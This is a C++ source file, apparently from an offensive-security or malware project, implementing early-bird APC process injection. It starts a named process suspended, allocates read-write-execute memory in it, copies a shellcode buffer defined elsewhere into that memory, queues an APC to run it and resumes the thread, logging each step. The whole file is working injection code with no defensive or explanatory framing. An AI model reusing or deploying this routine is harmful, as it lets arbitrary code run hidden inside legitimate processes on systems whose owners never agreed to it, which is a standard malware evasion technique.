#include "inject.h"

auto early_apc_queue(std::string const &process_name) -> bool
{
  auto si = STARTUPINFO{0};
  auto pi = PROCESS_INFORMATION{0};
  LPVOID shellcode_addr = NULL;
  ::ul::info(std::format("Create target process {}", process_name));
  auto ok = ::CreateProcessA(process_name.c_str(),  // name of the module to be executed
                             NULL,                  // the command line to be executed
                             NULL,                  // SECURITY_ATTRIBUTES for the new process
                             NULL,                  // SECURITY_ATTRIBUTES for the new thread
                             FALSE,                 // inherit handles
                             CREATE_SUSPENDED,      // creation flags
                             NULL,                  // environment
                             NULL,                  // current workign directory
                             &si, &pi);
  if (!ok) {
    ::ul::error(std::format("Cannot create process {}", process_name));
    goto Error;
  }

  ::ul::info("Allocate shellcode region into target process");
  shellcode_addr = ::VirtualAllocEx(pi.hProcess,            // target process
                                    NULL,                   // desired starting address for the region of pages that you want to allocate
                                    sizeof(g_shellcode),    // size of the allocation
                                    MEM_COMMIT,             // allocation type
                                    PAGE_EXECUTE_READWRITE  // memory protection
  );
  if (!shellcode_addr) {
    ::ul::error("Cannot allocate memory region (rwx) in target process");
    goto Error;
  }

  ::ul::info("Write shellcode into target process");
  ok = ::WriteProcessMemory(pi.hProcess,          // target process
                            shellcode_addr,       // memory region in target process
                            g_shellcode,          // data
                            sizeof(g_shellcode),  // data size
                            NULL                  // number of bytes written
  );
  if (!ok) {
    ::ul::error(std::format("Cannot write to the area of memory in the target process {}", process_name));
    goto Error;
  }

  ::ul::info("Queue APC to suspended thread");
  if (::QueueUserAPC((PAPCFUNC)shellcode_addr,  // application-supplied APC function to be called when the thread performs an alertable wait operation
                     pi.hThread,                // target thread (must have the THREAD_SET_CONTEXT access right)
                     NULL                       // APC parameter
                     ) == 0) {
    ::ul::error("Cannot queue APC");
    goto Error;
  }

  ::ul::info("Resume suspended thread");
  if (::ResumeThread(pi.hThread) == -1) {
    ::ul::error("Cannot resume thread");
    goto Error;
  }

  return true;

Error:
  if (shellcode_addr) ::VirtualFreeEx(pi.hProcess, shellcode_addr, sizeof(g_shellcode), MEM_RELEASE);

  ::CloseHandle(pi.hProcess);
  return false;
}